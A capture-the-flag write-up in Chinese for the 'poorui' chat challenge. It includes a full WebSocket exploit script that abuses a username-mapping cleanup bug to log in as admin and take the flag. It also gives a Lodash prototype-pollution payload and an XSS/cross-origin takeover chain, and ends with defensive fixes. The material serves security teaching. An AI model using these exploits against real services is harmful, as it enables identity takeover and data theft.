# poorui

## 题目简述

题目是一个 React 聊天前端，后端用 `ws` 维护 WebSocket 用户名映射，并额外启动两个客户端：

- `adminbot.js` 用 Puppeteer 访问 `/chat`，以用户名 `admin` 登录；
- `flagbot.js` 以用户名 `flagbot` 登录，只在收到 `from === "admin"` 的 `getflag` 请求时返回 flag。

后端没有密码、会话令牌或来源校验，身份完全等同于 WebSocket 登录时声明的用户名。源码还包含 Lodash 4.17.4 原型链污染与 React 属性展开形成的预期客户端攻击链，但检查当前仓库后，可以发现一个更直接且稳定的服务端非预期解：利用同名登录的清理逻辑移除真实 `admin` 的映射，再以 `admin` 身份登录并取 flag。

## 解题过程

### 1. 理清 flag 的授权条件

任意客户端发送：

```json
{"api":"getflag"}
```

`server.js` 会根据当前 WebSocket 在 `ws2username` 中的值构造请求，并转发给 `flagbot`：

```js
const apiGetFlag = (ws) => {
    username2ws.get('flagbot').send(JSON.stringify({
        api: "getflag",
        from: ws2username.get(ws)
    }))
}
```

`flagbot.js` 只检查字符串是否为 `admin`：

```js
const handleGetFlag = (from) => {
    if(from === 'admin'){
        conn.send(JSON.stringify({
            api: 'sendflag',
            flag: FLAG,
            to: from
        }))
    }
}
```

因此目标不是窃取某个管理员密钥，而是让服务端把攻击者的连接登记为 `admin`。

### 2. 利用关闭回调错误删除真实管理员映射

服务端同时维护两张表：

```text
ws2username: WebSocket -> username
username2ws: username -> WebSocket
```

登录处理的顺序存在问题：它先执行 `ws2username.set(ws, username)`，之后才检查用户名是否已经被占用。

```js
const apiLogin = (ws, username) => {
    ws2username.set(ws, username)
    if(username2ws.has(username)){
        sendWarning(ws, 'username already used!')
        ws.close()
        return
    }
    username2ws.set(username, ws)
    ws.send(`Now you are ${username}`)
}
```

攻击者第一次尝试登录 `admin` 时，`username2ws` 中确实已有 Puppeteer 管理员，所以新连接会被关闭；但它在 `ws2username` 中已经被标成了 `admin`。随后关闭回调取得这个用户名，并无条件删除 `username2ws.get("admin")`：

```js
ws.on('close', () => {
    const username = ws2username.get(ws)
    username2ws.delete(username)
    ws2username.delete(ws)
})
```

这里没有验证 `username2ws.get(username) === ws`。结果是：被关闭的攻击连接删除了属于另一个 WebSocket 的真实管理员映射。真实管理员连接本身仍然存活，但已经不再占用用户名；攻击者第二次连接时即可成功登记为 `admin`。

### 3. 完整利用脚本

下面的浏览器脚本完成“撞名清映射 → 重新登录 → 请求 flag”的全过程。把 `TARGET` 改为题目 WebSocket 地址即可：

```js
const TARGET = "ws://challenge.example:8081";

function parseJson(text) {
    try {
        return JSON.parse(text);
    } catch (_) {
        return null;
    }
}

function evictAdminMapping() {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(TARGET);

        ws.onerror = () => reject(new Error("first WebSocket failed"));
        ws.onmessage = (event) => {
            const message = parseJson(event.data);
            if (message && message.api === "login") {
                ws.send(JSON.stringify({api: "login", username: "admin"}));
            }
        };
        ws.onclose = () => resolve();
    });
}

function loginAndGetFlag() {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(TARGET);
        let loginSent = false;
        let flagRequested = false;

        ws.onerror = () => reject(new Error("second WebSocket failed"));
        ws.onmessage = (event) => {
            const message = parseJson(event.data);

            if (message && message.api === "login" && !loginSent) {
                loginSent = true;
                ws.send(JSON.stringify({api: "login", username: "admin"}));
                return;
            }

            if (event.data === "Now you are admin" && !flagRequested) {
                flagRequested = true;
                ws.send(JSON.stringify({api: "getflag"}));
                return;
            }

            if (message && message.api === "flag") {
                console.log(message.flag);
                ws.close();
                resolve(message.flag);
            }
        };
    });
}

(async () => {
    await evictAdminMapping();
    await new Promise((resolve) => setTimeout(resolve, 200));
    const flag = await loginAndGetFlag();
    document.body.innerText = flag;
})().catch(console.error);
```

真实比赛环境返回的 flag 由服务端环境变量提供；仓库中的 `ACTF{**********}` 只是占位符，因此不能从附件静态推断实际 flag。

### 4. 官方预期的客户端攻击链

仓库 `exploits/readme.md` 给出的预期思路由四步组成：

1. 模板消息在前端执行 `lodash.merge(attrs, JSON.parse(ctx))`；打包文件中的 Lodash 版本为 4.17.4，可通过恶意合并数据污染 `Object.prototype`；
2. 污染 `allowImage`，使没有显式传入该属性的 `MsgBubble` 仍能通过 `this.props.allowImage` 检查；
3. 图片消息把攻击者控制的 `attrs` 展开到 React `<div>` 上，利用 `dangerouslySetInnerHTML` 构造 XSS，并将管理员页面跳转到攻击者站点；
4. 管理员离开 `/chat` 后原 WebSocket 断开。攻击者页面趁 `adminbot.js` 三秒后返回 `/chat` 之前，跨站连接没有 Origin 校验的题目 WebSocket，以 `admin` 登录、取 flag 并外带。

官方文档中的核心原型链污染数据为：

```json
{
  "a": 123,
  "b": 123,
  "__proto__": {
    "allowImage": true
  }
}
```

图片属性的危险点是 React 的属性展开：

```jsx
<div
  style={{
    backgroundImage: `url(${data.src})`,
    backgroundSize: "contain",
    backgroundRepeat: "no-repeat",
    padding: "25%",
    height: 0
  }}
  {...attrs}
/>
```

需要注意源码版本差异：当前 `asset-manifest.json` 指向的 `main.6e3bc586.js` 会在渲染前递归删除字符串中的 `<`、`>`、反斜杠和下划线，所以官方 README 中包含字面量 `<img ...>` 与 `__proto__` 的原始 payload 不能直接照抄到这一构建。仓库同时残留了多个早期前端 bundle，其中部分没有该过滤。故这条链应当作为比赛预期机制与历史构建解法理解；对当前附件，服务端用户名映射漏洞更直接，也不依赖前端 bundle 版本。

## 方法总结

本题最重要的审计点是“谁拥有用户名”与“谁被清理”之间缺少对象一致性验证。处理双向索引时，关闭连接只能删除仍然指向自身的映射：

```js
if (username2ws.get(username) === ws) {
    username2ws.delete(username);
}
```

另外，服务端不应把客户端声明的用户名直接当作授权身份，也不应允许任意 Origin 的网页建立认证 WebSocket。预期链则展示了另一个组合风险：旧版 Lodash 深合并、原型继承式权限判断、React 任意属性展开和自动化管理员浏览器单独看都未必直接泄露 flag，串联后却能完成身份接管。

复盘这类题时应同时检查预期客户端链和更底层的状态机不变量。这里真正决定最短解的不是 XSS payload，而是同名失败连接可以删除其他连接的全局身份映射。
